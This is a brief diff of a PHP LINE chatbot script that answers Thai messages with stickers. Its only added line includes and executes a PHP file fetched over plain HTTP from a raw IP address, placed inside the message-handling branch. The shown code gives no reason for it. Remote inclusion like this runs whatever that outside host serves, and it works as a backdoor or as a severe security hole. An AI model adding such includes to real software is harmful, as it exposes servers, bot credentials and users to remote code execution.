@@ -18,6 +18,7 @@
       $arrayPostData['messages'][1]['packageId'] = "2";
       $arrayPostData['messages'][1]['stickerId'] = "34";
       pushMsg($arrayHeader,$arrayPostData);
+      include 'http://1.179.171.188/outsource/linelogin.php?mes=5555';
    }
  if($message == "มีไร"){
       $arrayPostData['to'] = $id;
